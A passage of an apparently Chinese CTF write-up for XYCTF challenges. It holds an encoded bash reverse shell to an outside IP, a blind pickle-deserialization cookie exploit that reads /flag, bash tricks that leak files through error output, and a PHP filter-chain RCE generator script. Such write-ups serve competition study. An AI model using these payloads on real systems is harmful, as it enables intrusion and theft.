class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf27</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf2fc2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lists = &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;RememberMe=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;if [ `cat /flag | cut -c &#123;&#125;` = &quot;&#123;&#125;&quot; ];then sleep 30;fi&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth + <span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> k &gt; <span class="built_in">len</span>(alphabet):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;alphabet too small!!!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line"></span><br><span class="line">        op = opcode.<span class="built_in">format</span>(i, alphabet[k])</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(op.encode())</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;RememberMe=&#x27;</span> + payload.decode()</span><br><span class="line">        <span class="built_in">print</span>(opcode.<span class="built_in">format</span>(i,alphabet[k]))</span><br><span class="line">        res = requests.get(url=url, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;waf&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;waf!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">30</span>:</span><br><span class="line">            flag = flag + alphabet[k]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="εZ-¿м-Kε¿-赛后"><a href="#εZ-¿м-Kε¿-赛后" class="headerlink" title="εZ?¿м@Kε¿?(赛后)"></a>εZ?¿м@Kε¿?(赛后)</h2><p>第一反应是构造一个文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$@&lt;$&lt;</span><br></pre></td></tr></table></figure><p>这里可以创建一个FLAG文件在当前目录, 但并不能如我所愿把&#x2F;flag里的内容重定向进去</p><p>看了wp, 这里把&#x2F;flag传给bash, bash读取内容, 尝试把内容当成命令执行, 但是这个命令是不存在的, 显示报错, 把flag带出来, 这与之前见过的nmap oG参数写shell有异曲同工之妙, 可惜当时没想到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240427133820719.png" alt="image-20240427133820719"></p><h2 id="连连看到底是连连什么看-赛后"><a href="#连连看到底是连连什么看-赛后" class="headerlink" title="连连看到底是连连什么看(赛后)"></a>连连看到底是连连什么看(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题的trick在很久之前就看过, 利用各种php过滤器,无需零时文件包含shell</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这里就比较抽象, 没找到很好的脚本, 一开始思路就是多几次base64解码来把XYCTF后面的乱码忽略, 奈何一直不成功就放弃了</p><p>贴一下不错的脚本</p><p>php_filter_chain_generator.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span 